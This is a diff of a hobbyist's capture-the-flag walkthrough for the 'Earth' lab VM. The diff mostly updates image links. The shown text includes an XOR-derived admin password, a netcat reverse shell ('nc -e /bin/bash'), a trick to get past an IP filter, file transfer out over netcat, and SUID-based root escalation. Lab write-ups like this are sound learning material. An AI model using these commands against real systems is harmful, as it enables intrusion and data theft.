@@ -54,11 +54,11 @@ So we can see that [[SSH]] is open and the hostkey's we see that port 80 is open
 Since we see these things I think the next step will be to look at the web page. 
 
 ## Web page
-![[Earth_VM WebServer Test Page.png]]
+![Earth_VM WebServer Test Page](https://github.com/user-attachments/assets/1460d8f6-d710-4a35-94d2-63594e43975d)
 So this is what we see when going to the web page. Well at least the nmap scan was able to provide us that this is an Apache 2.4.51 installation, so we are going to research that version of Apache and see if there are any known vulnerabilities which can be found at [[Apache 2.4 Vulnerabilities]]
 
 Here is the same web page but browsing to the HTTP version instead of HTTPS
-![[Earth_VM http web page.png]] 
+![Earth_VM http web page](https://github.com/user-attachments/assets/0a46ab29-d786-4676-834b-40e1eea033fe) 
 
 ## HTTP Methods
 Another interesting thing in the nmap scan was the potentially risky http methods, I am not much of a penetration tester, and I am still working on learning it here, so I'm going to do some research on the HTTP methods, which has lead me to this page at [[HTTP Method Exploitation]]. Typically the only HTTP methods that should be exposed are HEAD, GET, POST, CONNECT.
@@ -100,9 +100,9 @@ I read a lot on [[XSS]] and [[XST]], I am a little skeptical if I can use this m
 ## Burp Suite
 Started the Burp Suite and went to my favorite section the proxy section, and I opened the browser and went to the web address for 10.9.9.10, after looking at the GET request we received in Burp, I adjusted the host field to earth.local and sent the request.
 This immediately loaded us into the website.
-![[Earth_VM http web page loaded.png]]
+![Earth_VM http web page loaded](https://github.com/user-attachments/assets/2c41b8f8-1495-45ab-88f9-5b99867bed70)
 This is very interesting to me, so we can send a message, there's a message key and some previous messages. You may have noticed in the photo, but the web page is reloading, this is because my very next thought was to refresh the page, and see what the GET request looks like now! 
-![[Earth_VM Burp web page loaded request.png]]
+![Earth_VM Burp web page loaded request](https://github.com/user-attachments/assets/a2b7d956-1b48-4c7c-b937-5c8605bc5533)
 We get a cookie with a csrftoken, surely that will be useful so I am going to paste that here.
 ```Cookie: csrftoken=dssBtXOheAqOCNlvquuRp6RglpISRzQxWEtjT7dXBSVPIWOO9bmNADZJrdCNeTY3```
 So while I was at it, I decided I wanted to see what curl would provide. 
@@ -147,9 +147,10 @@ This next piece is really interesting to me. What if I refresh my page again and
 <label for="message">Send your message to Earth:</label>
     <input type="hidden" name="csrfmiddlewaretoken" value="YgXXNUuSElDUsVtin5g3GYuXl4xXemGZTrs7M8ClZ30t1RlF33WCNvVidnblxUVO">
 ```
-![[Earth_VM swapped csrftoken.png]]
+![Earth_VM swapped csrftoken](https://github.com/user-attachments/assets/cd7e8c11-ca74-44f3-99a8-017d5fd36bc3)
 I got no change, I'm not really surprised, as I believe that middleware csrftoken is likely used when a message is sent, but I haven't tried that yet, so we'll be doing that next, it should be one of the basic first steps, but I like to gather as much information with one thing at a time. 
 Okay instead of sending basic data, I am super curious, what if I use the middleware csrftoken as the message key and send out the first previous message. 
+/* Note from Cory After proof reading: I now know what a csrftoken is haha. Web Apps are not a strong point. I'd love to know if there was an attack vector with the csrftokens though. I kinda feel like there is a way to use it, but I just don't know enough. */
 I suppose I don't need to share burp images, here's the post request that was sent.
 ```
 POST / HTTP/1.1
@@ -173,7 +174,7 @@ csrfmiddlewaretoken=fPQ00crRX5rK284n8vLWADUFi9TVZXXEa0laZqzkiNOjB4WKOtrvHal0asxj
 The csrfmiddlewaretoken is different again, but we can see the message and message key sent as well. 
 
 So I accidentally sent that post request twice, and then I sent another with the words "Hello" as the Message and "something" as the message key
-![[Earth_VM hello something message.png]]
+![Earth_VM hello something message](https://github.com/user-attachments/assets/0536bafc-0c1c-44c5-ad78-d70d1d8ccd8e)
 So my next though it's definitely running some code to encrypt the messages here. I wonder what type of encryption, that also means to me we might want to try and decrypt the other messages, I'm going to send another request, and the message and message key will both be "a" which gave us a previous message of "00"
 So I sent another request with the key being "b" and the message "a" which gives us "03"
 I now swapped it so the message is "b" and key is "a" this also gave us "03"
@@ -186,15 +187,15 @@ echo "10.9.9.10 earth.local >> /etc/hosts"
 echo "10.9.9.10 terratest.earth.local >> /etc/hosts"
 ```
 To add the server names to the host files, so we can browse to the host name instead of IP address and not have to approve our requests manually anymore, I also want to check out the terratest.earth.local, because it's interesting that there's a DNS name for both. 
-![[Earth_VM terratest.earth.local-robots.txt.png]]
+![Earth_VM terratest earth local-robots txt](https://github.com/user-attachments/assets/6e05d21a-6f3f-4655-bf73-a78820b7b169)
 Well robots are disallowed, but I surely am not a robot, so let's take a look what is in that directory. 
-![[Earth_VM terratest.earth.local-testingnotes.txt.png]]
+![Earth_VM terratest earth local-testingnotes txt](https://github.com/user-attachments/assets/1cfea973-3fc8-4f84-97b9-0e4f52112f84)
 Alright, so I was already assuming that we were looking at [[XOR encryption]] for those messages, specifically because of how the interaction was between the same character letters. 
 We are going to go look at testdata.txt next but we got an admin username which is also pretty cool. The earth.local host has an admin page, that we can see now that we have our host file set up.
-![[Earth_VM terratest.earth.local-testdata.txt.png]]
+![Earth_VM terratest earth local-testdata txt](https://github.com/user-attachments/assets/9af06b79-764a-4b95-b092-d0eb81d3e661)
 Interesting, that's something I did not know, what I do know is that phrase was used to test encryption. That is likely the very first message sent on the page, so that gives us some more information.
 The Todo section of the testingnotes.txt file tells us a couple more things, specifically the messaging and admin interface are basic, they probably are susceptible to some attacks I'm not yet familiar with, but FIRST we have the Plain Text and Cipher Text of the messages, so lets see if we can get the Key, I used [[CyberChef]] for this.
-![[Earth_VM XOR decoded ciphertext with plaintext.png]]
+![Earth_VM XOR decoded ciphertext with plaintext](https://github.com/user-attachments/assets/2bf57d1d-17d8-401a-b060-6ed19dda5e5d)
 So this gives us the output key of  
 ```
 earthclimatechangebad4humans
@@ -203,12 +204,12 @@ We are going to try this key with the other two messages to see if we can decode
 
 Out of absolute curiosity let's see if this is the password to the login page, with the username we had found earlier.
 That is entirely what it was. 
-![[Earth_VM logged_in.png]]
+![Earth_VM logged_in](https://github.com/user-attachments/assets/d4b37255-bb00-4e3d-81cf-0f1595ed8b08)
 We are given a [[CLI]] which is interesting, so lets enumerate a little, we can see we are the apache user, I wonder if we could get root from this little CLI prompt. 
 
 So after some browsing I was able to find the flag located in /var/earth_web/user_flag.txt
 This is the first of 2 flags we are looking for on this machine. The other I know we need root access for.
-![[Earth_VM user_flag.txt.png]]
+![Earth_VM user_flag txt](https://github.com/user-attachments/assets/08588288-0deb-479b-aafe-67c7111fc8a1)
 
 So let's try to connect to this system in a better way, because this CLI is hard to use and read haha. 
 To do that lets go to our Kali VM and run 
@@ -220,13 +221,13 @@ Then we can run in the CLI command
 ```
 nc -e /bin/bash 10.0.0.2 4444
 ```
-![[Earth_VM nc fromCLI.png]]
+![Earth_VM nc fromCLI](https://github.com/user-attachments/assets/eb81634c-ad4c-4aa0-9741-549e24c1e655)
 Huh remote connections are forbidden, I'm sure there is a way we can get around this, because the info in the testdata file stated that the messaging interfaces were pretty basic.
 so lets modify our nc command
 ```
 nc -e /bin/bash kali 4444
 ```
-![[Earth_VM ncConnected.png]]
+![Earth_VM ncConnected](https://github.com/user-attachments/assets/2c370469-b618-442c-9ce9-ffee6840057c)
 To my surprise it connected, in my lab setup, my [[PFSense]] firewall is setup with the DNS name for kali. I imagine the web page is designed to throw an error when it encounters an IP address, you could probably obfuscate the CLI command to get it to run as well, but replacing the IP with a [[DNS]] name is really easy.
 From here we can do some enumeration much easier than in the web interface.
 ```
@@ -234,7 +235,7 @@ find / -perm -u=s -type f 2>/dev/null
 ```
 This command will search the entire root directory, for permission files with the set uid bit, this bit allows a file to execute with the permissions of it's owner rather than the user who runs it. the passwd command could be an example of this.
 The type is looking for files rather than folders. and the 2>/dev/null gets rid of any errors. so it doesn't print to the screen. Here is what we receive from running that.
-![[Earth_VM findcommandran.png]]
+![Earth_VM findcommandran](https://github.com/user-attachments/assets/c10472b9-ba3d-4196-a409-42b024123b30)
 What looks really interesting here is the reset_root file. Running that file it states 
 ```
 reset_root
@@ -253,7 +254,7 @@ nc -w 3 kali 3333 < /usr/bin/reset_root
 ```
 This should send the file to our Kali VM where we can view the contents of it.
 From there we are going to run ltrace on the file.
-![[Earth_VM ltrace.png]]
+![Earth_VM ltrace](https://github.com/user-attachments/assets/ff4206c4-d721-4445-9950-1ba0676c1e79)
 So it looks like the program checks to see if those files exist before executing. So we are going to create each of those files.
 ```
 touch /dev/shm/kHgTFI5G
@@ -285,7 +286,7 @@ From here we have complete admin access to the VM. so lets run
 ls /root
 ```
 And we see the root_flag.txt file so lets cat that out, and that gives us our final flag for this VM.
-![[Earth_VM rootflagFound.png]]
+![Earth_VM rootflagFound](https://github.com/user-attachments/assets/cfd6763b-d5e3-408b-b801-0e7a039d6dfa)
 
 ## Flags
 user_flag_3353b67d6437f07ba7d34afd7d2fc27d
@@ -296,9 +297,9 @@ This was a pretty easy VM, I went down a couple of rabbit holes that didn't work
 It was less of a web challenge than I hoped, and more of a Linux system challenge with some web elements.
 I can imagine someone with more experience could solve this VM in a matter of minutes. One day I'll get there.
 # Resources
-[[Apache 2.4 Vulnerabilities]]
-[[HTTP Method Exploitation]]
-[[Cross Site Tracing - OWASP]]
-[[Cross Site Scripting - XSS - OWASP]]
-[[Cross Site Scripting Prevention Cheat Sheet - OWASP]]
-[[DOM Based XSS Prevention Cheat Sheet - OWASP]]
+[[Apache 2.4 Vulnerabilities]] - https://httpd.apache.org/security/vulnerabilities_24.html
+[[HTTP Method Exploitation]] - https://security.stackexchange.com/questions/21413/how-to-exploit-http-methods
+[[Cross Site Tracing - OWASP]] - https://owasp.org/www-community/attacks/Cross_Site_Tracing
+[[Cross Site Scripting - XSS - OWASP]] - https://owasp.org/www-community/attacks/xss/ and https://owasp.org/www-community/Types_of_Cross-Site_Scripting
+[[Cross Site Scripting Prevention Cheat Sheet - OWASP]] - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html 
+[[DOM Based XSS Prevention Cheat Sheet - OWASP]] - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html /* I did not read this one, just included it as I am Blue Team guy, so I want to know how to prevent some of this stuff. :) */
